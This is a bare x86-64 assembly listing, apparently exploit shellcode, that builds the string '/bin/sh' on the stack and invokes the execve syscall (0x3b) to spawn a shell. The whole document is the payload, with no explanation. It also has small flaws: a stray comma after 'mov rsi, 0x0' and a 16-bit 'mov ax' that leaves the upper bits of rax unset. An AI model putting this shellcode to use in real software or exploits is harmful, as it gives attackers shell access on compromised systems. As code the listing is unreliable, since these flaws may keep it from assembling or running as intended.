BITS 64

mov rdi, 0x0068732f
shl rdi, 32
mov rcx, 0x6e69622f
or rdi, rcx
mov [rsp], rdi
mov rdi, rsp
mov ax, 0x3b
mov rsi, 0x0, 
mov rdx, 0x0
syscall